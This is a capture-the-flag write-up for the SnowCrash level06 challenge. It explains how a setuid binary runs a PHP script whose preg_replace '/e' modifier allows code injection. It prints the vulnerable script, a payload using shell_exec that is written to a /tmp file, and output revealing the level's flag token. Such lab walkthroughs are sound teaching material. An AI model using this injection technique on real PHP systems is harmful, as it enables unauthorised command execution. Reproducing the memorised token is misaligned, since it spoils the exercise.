# Flag 06

In level06 home directory we found two files.
```
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php

```
A binary that's executed with the userid of its owner after using binary ninja we found the the binary run the php script & php script:
```php
#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```
The php script take two arguments but only use the first as a file name and reads from it.
we copied the php script to the host machine in order to format it and clearly read it and test it.
after running the script we got the error
```
PHP Warning:  preg_replace(): The /e modifier is no longer supported, use preg_replace_callback instead in /home/anas/Projects/cursus/snowCrash/level06/Resources/level06.php on line 12
```
So we search about the `The /e modifier` in google and we found out that it's deprecated because it contains a vulnerability 🤩,
now we just nees to exploit it, we used shell_exec php function that execute shell commands and use the return as variable so php would throw an error with the return.

```
level06@SnowCrash:~$ echo "[x \${\${shell_exec(getflag)}}]" > /tmp/getflag06
level06@SnowCrash:~$ ./level06 /tmp/getflag06
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable:  in /home/user/level06/level06.php(4) : regexp code on line 1

```